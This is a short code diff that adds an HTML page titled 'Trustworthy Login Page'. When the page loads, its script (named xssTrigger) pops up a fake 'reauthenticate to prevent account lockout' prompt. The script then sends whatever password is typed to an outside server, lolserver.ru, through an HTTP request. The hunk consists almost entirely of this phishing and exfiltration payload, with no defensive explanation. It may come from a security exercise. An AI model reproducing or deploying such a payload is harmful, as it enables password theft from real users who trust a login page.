@@ -11,3 +11,16 @@
   <body onload="myFunction()">
 </html>
 
+<html>
+ <title>Trustworthy Login Page</title>
+  <script>
+   function xssTrigger() {
+    var pass = prompt("Please Reauthenticate to prevent account lockout:");
+    alert("OMNOMNOM");
+    xhr.open("GET", "https://lolserver.ru?pass="+pass)
+    xhr.send();
+   }
+  </script>
+
+  <body onload="xssTrigger()">
+</html>
